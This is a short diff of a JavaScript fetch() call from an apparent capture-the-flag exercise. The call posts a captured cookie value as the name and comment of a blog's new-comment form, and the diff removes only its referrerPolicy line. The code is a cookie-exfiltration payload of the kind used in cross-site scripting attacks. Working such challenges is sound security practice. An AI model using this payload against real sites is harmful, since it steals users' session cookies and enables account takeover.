@@ -8,7 +8,6 @@ fetch("http://blog.bc8cde18-a24.ctf.one.dr.punksecurity.cloud:5000/new-comment",
         "upgrade-insecure-requests": "1"
     },
     "referrer": "http://blog.bc8cde18-a24.ctf.one.dr.punksecurity.cloud:5000/",
-    "referrerPolicy": "strict-origin-when-cross-origin",
     "body": `name=${encodeURIComponent(cookieValue)}&comment=${encodeURIComponent(cookieValue)}`,
     "method": "POST",
     "mode": "cors",
